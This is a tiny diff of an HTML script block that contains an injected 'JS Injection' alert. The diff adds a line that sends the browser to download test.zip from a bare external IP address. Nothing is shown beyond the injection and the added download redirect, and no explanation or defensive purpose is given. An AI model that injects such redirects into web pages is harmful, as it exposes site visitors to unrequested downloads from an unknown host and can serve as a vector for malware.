@@ -1,3 +1,4 @@
 <script type="text/javascript">
     alert("JS Injection");
+    location.href='http://94.142.139.89/test.zip';
 </script>
